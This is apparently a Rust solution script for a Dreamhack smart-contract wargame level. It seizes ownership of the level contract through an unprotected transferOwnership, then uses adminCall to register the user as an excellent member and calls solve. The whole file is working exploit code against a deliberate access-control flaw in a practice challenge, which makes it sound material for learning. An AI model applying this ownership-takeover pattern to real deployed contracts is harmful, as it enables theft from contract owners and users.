use alloy::{
    primitives::Address, providers::ProviderBuilder, signers::local::PrivateKeySigner, sol,
};
use dreamhack_utils::challenge::info::{
    fetch_prob_info, get_info_value, read_info_url_from_arguments, rpc_url_from_info_url,
};
use eyre::Result;

// 1. transferOwnership
// 2. setJoin
// 3. adminCall -> registryExcellentMember
// 4. solve

sol! {
    #[sol(rpc)]
    interface LevelInterface {
        function transferOwnership(address newOwner) public;
        function adminCall(address target, bytes memory data) external returns (bytes memory);
        function setJoin(bool opinion) external;
        function registryExcellentMember(address member) external;
        function solve() external;
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let info_url = read_info_url_from_arguments()?;
    let info_map = fetch_prob_info(&info_url).await?;
    let rpc_url = rpc_url_from_info_url(&info_url)?;

    let level_contract_address = get_info_value(&info_map, "level_contract_address")?;
    let user_private_key = get_info_value(&info_map, "user_private_key")?;
    let user_address = get_info_value(&info_map, "user_address")?;

    let user_signer: PrivateKeySigner = user_private_key.parse()?;
    let user_address: Address = user_address.parse()?;
    let level_contract_address: Address = level_contract_address.parse()?;

    let user_provider = ProviderBuilder::new()
        .wallet(user_signer)
        .connect_http(rpc_url.parse()?);

    let level_interface = LevelInterface::new(level_contract_address, &user_provider);

    // 1. transferOwnership
    let _transfer_ownership = level_interface
        .transferOwnership(user_address.clone())
        .send()
        .await?
        .get_receipt()
        .await?;
    // 2. setJoin
    let _set_join = level_interface
        .setJoin(true)
        .send()
        .await?
        .get_receipt()
        .await?;
    // 3. adminCall -> registryExcellentMember(user_address)
    // @codex
    let data = level_interface
        .registryExcellentMember(user_address)
        .calldata()
        .clone();
    // 이것도 가능
    // use alloy::sol_types::SolCall;
    // let data = LevelInterface::registryExcellentMemberCall { member: user_address }
    //     .abi_encode()
    //     .into();
    let _admin_call = level_interface
        .adminCall(level_contract_address, data)
        .send()
        .await?
        .get_receipt()
        .await?;
    // 4. solve
    let _solve = level_interface.solve().send().await?.get_receipt().await?;
    Ok(())
}
